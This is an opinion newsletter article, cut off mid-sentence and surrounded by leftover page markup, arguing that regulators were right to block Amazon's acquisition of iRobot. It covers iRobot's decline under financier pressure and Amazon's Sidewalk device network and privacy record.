https://substackcdn.com/image/fetch/$s_!TnFC!,w_120,h_120,c_fill,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 120w" sizes="40px"><img src="https://substackcdn.com/image/fetch/$s_!TnFC!,w_40,h_40,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png" sizes="40px" alt="X avatar for @jasonfurman" srcset="https://substackcdn.com/image/fetch/$s_!TnFC!,w_40,h_40,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 40w, https://substackcdn.com/image/fetch/$s_!TnFC!,w_80,h_80,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 80w, https://substackcdn.com/image/fetch/$s_!TnFC!,w_120,h_120,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png 120w" width="40" height="40" draggable="false"></picture></div><p><span>Jason Furman</span><span>@jasonfurman</span></p><svg role="img" style="height:20px;width:20px;" width="20" height="20" viewBox="0 0 20 20" fill="var(--color-fg-primary)" stroke-width="1.8" stroke="#000" xmlns="http://www.w3.org/2000/svg"><g><title></title><path stroke="none" fill-rule="evenodd" clip-rule="evenodd" d="M13.2879 19.1666L8.66337 12.575L2.87405 19.1666H0.424805L7.57674 11.0258L0.424805 0.833252H6.71309L11.0717 7.04577L16.5327 0.833252H18.982L12.1619 8.59699L19.5762 19.1666H13.2879ZM16.0154 17.3083H14.3665L3.93176 2.69159H5.58092L9.7601 8.54422L10.4828 9.55981L16.0154 17.3083Z"></path></g></svg></div><p>Regulators in the United States &amp; Europe blocked Amazon's bid to acquire iRobot.

iRobot has not filed for bankruptcy and will be acquired by its main creditor, a Chinese company.

This is not a good outcome from the perspective of consumers, competition or the national interest.</p><div><p><span>9:34 PM · Dec 15, 2025</span></p><p><span>36 Reposts</span><span> · </span><span>347 Likes</span></p></div></div></a><p>So is Furman right? This critique matters, because the goal here is to return to the economic statecraft of Bush and Obama, a time when the consensus was that concentrating capital would generate positive outcomes, while restraints on capital would hinder growth. The modest burst of populism around antitrust under Joe Biden deeply shook Furman. With iRobot’s bankruptcy, there is now an opportunity to make the claim that any attempt to restrain Wall Street is a mistake. So what exactly happened with iRobot? And what kinds of lessons should we draw? </p><p><span>I first came upon iRobot years before the Amazon merger, when I edited a </span><a href="https://www.promarket.org/2021/01/28/wall-street-danger-national-security-roomba-hedge-fund/" rel="">piece</a><span> by defense analyst Lucas Kunce on Wall Street and national security. I had gotten interested in the collapse of the defense base, a crisis which is now widely discussed, but at the time wasn’t well-understood. Part of that collapse was a result of a phenomenon where financiers would force technology companies to stop innovating.</span></p><p>iRobot fit perfectly in that story. I watched a 2017 hearing in the House Armed Services Committee where a former Vice Admiral for the Navy, Joe Dyer, testified. After leaving the Navy, Dyer worked in operations at the robotics firm, when the company was far more than a consumer firm focused on importing automated cleaning tools from China. Here’s Kunce:</p><blockquote><p><span>iRobot, which started in 1990 as a spinoff of MIT, was founded by three experts in robotics, artificial intelligence, and man-machine interface. In 1998, the company got </span><a href="http://www.irobot.com/About-iRobot/Company-Information/History.aspx" rel="">a grant</a><span> from the Defense Advanced Research Projects Agency (DARPA), </span><a href="http://www.businessinsider.com/5-inventions-darpa-gps-irobot-roomba-internet-2017-5" rel="">the government agency that financed the creation of the internet, SIRI, the predecessor to GPS, and other conveniences of modern life</a><span>. Their mission was to build an advanced robot that eventually came to be known as the PackBot. Packbot helped search the rubble after 9/11 and aided US troops in clearing mines in Iraq and Afghanistan. iRobot’s robotic technology has gone to Mars on rovers and was deployed in the Fukushima nuclear reactor meltdown to measure radioactivity. Its iRobot Seaglider was used to peer underwater after the Deepwater Horizon oil spill.</span></p><p><span>But iRobot no longer makes anything for the military. It now focuses, instead, on branding and manufacturing vacuum cleaners in </span><a href="https://roboticsandautomationnews.com/2020/01/06/irobot-begins-manufacturing-operations-in-malaysia/28231/" rel="">China and Malaysia</a><span>. </span></p></blockquote><p>In the mid-2010s, during Furman’s tenure running economic policy under Obama, the company sold its defense business, offshored production, and slashed research, a result of pressure from financiers on Wall Street.</p><blockquote><p><span>An iRobot shareholder and former Goldman Sachs partner running a hedge fund called Red Mountain Capital, Willem Mesdag, sent </span><a href="https://www.sec.gov/Archives/edgar/data/1159167/000119312515392141/d24166dsc13da1.pdf" rel="">a letter</a><span> demanding that the company sell or shut down every part of its business that didn’t have to do with robots that clean things. </span></p><p><span>He demanded that the company slash its research budget, use the excess cash for dividends, and focus on branding and extending its near-monopoly in automated vacuum cleaners (68 percent of the global market share, according to Mesdag’s letter). Mesdag engaged in a proxy fight to wrest control of the company from its engineering founders, accusing one of its founders and iRobot Chairman Colin Angle of engaging in “egregious and abusive use of shareholder capital” for </span><a href="https://www.xconomy.com/boston/2015/01/27/after-12-years-of-roomba-irobot-eyes-startups-for-sector-growth/" rel="">investing in research</a><span>. </span></p><p>Research that, according to an iRobot spokesman, was intended “to spur innovation in robotics and robotics-related areas.” Mesdag argued that the money should have been used for share buybacks to boost the stock value instead of for research…</p><p>“In my trips to Wall Street,” Dyer told the panel, “one of my analyst friends took me to lunch one day and said, ‘Joe, you have to get iRobot out of the defense business. It’s killing your stock price.’ And I countered by saying ‘Well, what about the importance of DARPA and leading-edge technology? What about the stability that sometimes comes from the defense industry? What about patriotism?’ And his response was, ‘Joe, what is it about capitalism you don’t understand?’”</p></blockquote><p><span>This is a sad story, it’s also a common one. China has captured technology and key process leadership from American and European firms, across everything from rare earths to batteries to chemicals to robotics. And the driver is that the American model of running corporations is to focus on “asset light” cream-skimming, which is to say, </span><a href="https://americanaffairsjournal.org/2021/08/the-value-of-nothing-capital-versus-growth/" rel="">focusing</a><span> on lines of business where the return on capital is exceptionally high. </span></p><p><span>Conversely, the Chinese government, to preserve and extend its particular authoritarian model, actually suppresses the return on capital for its financiers, forcing an “asset heavy” approach. They overly emphasize factories and engineering. The net effect of these two complementary forces used to be celebrated as “</span><a href="https://www.telegraph.co.uk/comment/5424112/The-trillion-dollar-question-China-or-America.html" rel="">Chimerica</a><span>,” where China produces and the U.S. consumes. </span></p><p>The consequence of this dynamic is the movement of production from America to China; iRobot is just one example out of many. But there’s another dynamic aside from trade, and that has to do with a peril of market power. Like a lot of firms with seeming dominance, such as Boeing and Intel, iRobot had a big market share, but its operational capacity degraded quickly as financiers forced the company to harvest its monopoly and add nothing back. Under a trade regime overseen by men like Furman, the company offshored production, thus teaching its future rivals in China how to make robot cleaners. </p><p>At any rate, by 2022, iRobot still had a dominant share of robot vacuum cleaners, but competition had become meaningful. </p><p><span>Enter Amazon. In the late 2010s and early 2020s, big tech firms were seeking to dominate the “smart home” market, as well as building out networks around the “internet of things” and cloud computing. Amazon was engaged in a roll-up of the smart home space. It had built out the Alexa audio device, and bought the Ring security/doorbell firm (which had acquired smart lighting firm </span><a href="https://techcrunch.com/2018/01/08/ring-acquires-smart-led-light-company-mr-beams/" rel="">Mr. Beams</a><span>), as well as the wifi firm Eero in 2019, and </span><a href="https://www.theverge.com/22704290/amazon-blink-ring-camera-doorbell-brands-smart-home-why" rel="">video camera firm Blink</a><span>. It was a very expensive strategy; Ring was nearly bankrupt when Amazon overpaid for the company. According to the Wall Street Journal, between 2017 and 2021, Amazon </span><a href="https://www.wsj.com/tech/amazon-alexa-devices-echo-losses-strategy-25f2581a?gaa_at=eafs&amp;gaa_n=AWEtsqdfXRSaceVjg_5A9Lo_20Wf30Xh_EQyLk1MS7weaLCB8GO5ZiX2ruw8qOupjUk%3D&amp;gaa_ts=694423f0&amp;gaa_sig=4RIOPDy4JL9FJ44zG_mF-QV0SLfN0oBvr8AUTtS9cFI_Xf4cqCc15_p4o1s-DsvLe6PSAHWZWS766CRa7v_vDQ%3D%3D" rel="">lost</a><span> more than $25 billion in losses from its devices business.” </span></p><p><span>But Amazon continued. In 2022, it </span><a href="https://www.prnewswire.com/news-releases/amazon-and-irobot-sign-an-agreement-for-amazon-to-acquire-irobot-301600720.html" rel="">announced</a><span> the acquisition of iRobot for $1.7 billion. This deal would seemingly solve iRobot’s problems stemming from a lack of research and production capacity. It would also make people very wealthy. Angle himself would </span><a href="https://www.sec.gov/Archives/edgar/data/1159167/000119312523220091/d496206ddefm14a.htm" rel="">receive</a><span> $14 million upon completion of the deal, and the entire executive team would be paid lavishly.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!WO9I!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!WO9I!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 424w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 848w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 1272w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!WO9I!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png" width="881" height="272" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:272,&quot;width&quot;:881,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:77178,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.thebignewsletter.com/i/181986493?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!WO9I!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 424w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 848w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 1272w, https://substackcdn.com/image/fetch/$s_!WO9I!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F52d8b346-fa24-4d55-af17-65331f9c3fa2_881x272.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>Nevertheless, Amazon is a very powerful firm, so the FTC, as well as European enforcers, began an investigation. In late 2023, the Europeans issued a </span><a href="https://ec.europa.eu/commission/presscorner/detail/en/ip_23_5990" rel="">preliminary statement of objections</a><span>, which isn’t a formal challenge but a note to Amazon suggesting there might be problems. The EU argued that Amazon might self-preference its robot vacuum cleaners on its ubiquitous marketplace, and thwart competition. </span></p><p><span>The FTC didn’t bring a challenge, but nevertheless, in 2024, Amazon and iRobot </span><a href="https://investor.irobot.com/news-releases/news-release-details/amazon-and-irobot-agree-terminate-pending-acquisition" rel="">called</a><span> off the deal. The FTC issued a vague statement announcing it was pleased with the end of the transaction. “The Commission’s probe focused on Amazon’s ability and incentive to favor its own products and disfavor rivals’,” it </span><a href="https://www.ftc.gov/news-events/news/press-releases/2024/01/statement-regarding-termination-amazons-proposed-acquisition-irobot" rel="">wrote</a><span>, “and associated effects on innovation, entry barriers, and consumer privacy. The Commission’s investigation revealed significant concerns about the transaction’s potential competitive effects.” </span></p><p>I don’t know what the FTC found, that’s confidential. But I spoke with a former employee of Ring and Latch who explained Amazon’s monopolization strategy. This person’s view is that Amazon wasn’t trying to dominate the robot vacuum cleaner market for its own sake, but as part of a much bigger plan. With Ring, Eero, Alexa, and iRobot devices, Amazon would have the largest network of consumer internet of things (IoT) devices in the world. Here’s what this person argued about this set of acquisitions:</p><blockquote><p>Amazon wanted Ring for Iotera, a company Ring acquired in late 2017. Iotera built a proprietary protocol for smart devices. Internally, it was known as RingNet, but now it is known as Amazon Sidewalk. Unlike Wifi, Bluetooth, Zigbee, or Z-Wave, Sidewalk requires users to use the Alexa ecosystem. Amazon has grown its Sidewalk network via Alexa and Ring devices sold below cost and acquisitions of companies like Eero and soon, iRobot.</p></blockquote><p>As these devices can connect with each other, they would become the “basis of a physical network connecting devices and sensors all over the world.”  This argument isn’t speculation; my source was the first Ringnet/sidewalk product manager at Ring, directly responsible for integrating Iotera technology into Ring camera, Mr. Beams, and Ring Alarm. This person wrote strategy docs, organized legal/business requirements, and coordinated hardware and software development across all the different units. </p><p><span>There’s also a lot of public evidence. Here’s Amazon describing </span><a href="https://www.amazon.com/gp/help/customer/display.html?nodeId=GN9U5W9UZU2G5VBW" rel="">this network</a><span>:</span></p><blockquote><p>Amazon Sidewalk creates a low-bandwidth network with the help of Sidewalk Bridge devices including select Echo and Ring devices. These Bridge devices share a small portion of your internet bandwidth which is pooled together to provide these services to you and your neighbors. And when more neighbors participate, the network becomes even stronger.</p></blockquote><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!Geyn!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!Geyn!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 424w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 848w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 1272w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!Geyn!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png" width="1019" height="715" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:715,&quot;width&quot;:1019,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:196022,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.thebignewsletter.com/i/181986493?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!Geyn!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 424w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 848w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 1272w, https://substackcdn.com/image/fetch/$s_!Geyn!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa01cfcbc-0a64-4d78-97ec-8204cc9e5aab_1019x715.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>This </span><a href="https://docs.sidewalk.amazon/introduction/sidewalk-how-works.html" rel="">image</a><span> comes from Amazon’s documentation on how Sidewalk works.</span></figcaption></figure></div><p><span>Amazon even </span><a href="https://techcrunch.com/2025/11/16/amazon-satellite-network-gets-a-rebrand-and-drops-its-affordability-pitch/" rel="">renamed</a><span> its satellite service, Project Kuiper, to Leo, pivoting away from consumer access a la Starlink to fostering this IoT backbone. Sidewalk would let consumers stay connected, without broadband, through a proprietary surveillance heavy Amazon-run network.</span></p><p><span>This situation probably set off alarm bells among enforcers. Amazon has a vast surveillance apparatus, and its devices business had already been </span><a href="https://www.ftc.gov/news-events/news/press-releases/2023/05/ftc-doj-charge-amazon-violating-childrens-privacy-law-keeping-kids-alexa-voice-recordings-forever" rel="">charged</a><span> multiple times by the government with violating privacy laws.  </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!dyTX!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!dyTX!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 424w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 848w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 1272w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!dyTX!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png" width="1298" height="477" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:477,&quot;width&quot;:1298,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:105950,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.thebignewsletter.com/i/181986493?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!dyTX!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 424w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 848w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 1272w, https://substackcdn.com/image/fetch/$s_!dyTX!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4799804e-d456-48ce-81c2-66c2659cc2d4_1298x477.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>At one point, Ring was </span><a href="https://www.ftc.gov/news-events/news/press-releases/2023/05/ftc-says-ring-employees-illegally-surveilled-customers-failed-stop-hackers-taking-control-users" rel="">accused</a><span> of “allowing any employee or contractor to access consumers’ private videos and by failing to implement basic privacy and security protections, enabling hackers to take control of consumers’ accounts, cameras, and videos.” One government complaint alleged that a Ring employee “viewed thousands of video recordings belonging to female users of Ring cameras that surveilled intimate spaces in their homes such as their bathrooms or bedrooms.” And it wasn’t just the FTC, there was </span><a href="https://blog.helium.com/the-people-v-amazon-fc7adff28e3c" rel="">substantial</a><span> </span><a href="https://www.wired.com/story/how-amazon-sidewalk-works/" rel="">concern</a><span> from rivals and consumer advocates over Amazon’s use of Sidewalk to open up a new path to surveil consumers. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!zuIe!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!zuIe!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 424w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 848w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 1272w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!zuIe!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png" width="1298" height="571" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/b45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:571,&quot;width&quot;:1298,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:297074,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://www.thebignewsletter.com/i/181986493?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/$s_!zuIe!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 424w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 848w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 1272w, https://substackcdn.com/image/fetch/$s_!zuIe!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb45fe912-4dc6-4dd1-ba82-4181911f48e7_1298x571.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>It wasn’t just a consumer strategy. Amazon is now selling </span><a href="https://press.aboutamazon.com/2023/3/amazon-invites-developers-to-test-sidewalk-and-build-the-next-billion-connected-devices" rel="">access</a><span> to Sidewalk to industrial customers, linking access to Sidewalk to its cloud computing service Amazon Web Services. In other words, Amazon was seeking to become the proprietary backbone for any industrial firm who wants to link a device with 90% of America, outside of cellular networks, and that could include maps of most homes and neighborhoods. Amazon spent $25 billion on its device network, and would have been perfectly happy to engage in self-preferencing and predatory pricing of iRobot products to further its aims. </span></p><p>After this acquisition, Amazon would add iRobot’s suite of products and IP to its own portfolio, as well as the rich network and stream of data. But such a merger likely wouldn’t have helped prevent national security problems or kept robotics capacity in the U.S. Amazon is known to be aggressive about ensuring that production happens in China, so it’s almost a certainty manufacturing would continue there, and Chinese firms would likely still come to dominate most non-U.S. and European markets. For Amazon, the goal was the network, not to make robots.</p><p><span>When the deal fell apart, Amazon </span><a href="https://techcrunch.com/2025/12/14/how-irobot-lost-its-way-home/" rel="">paid</a><span> iRobot a $94 million break-up fee, which could be significantly more than the cost of litigating a case, so it is clear the two firms thought the FTC could have challenged it and might have won. After the failed merger, Angle stepped down as CEO, but expressed optimism, saying that “iRobot now turns toward the future with a focus and commitment to continue building thoughtful robots and intelligent home innovations that make life better, and that our customers around the world love.”</span></p><p><span>In 2024, when the two firms decided not to move forward with the deal, iRobot hired a “turnaround” specialist named Gary Cohen to run iRobot. The Carlyle Group </span><a 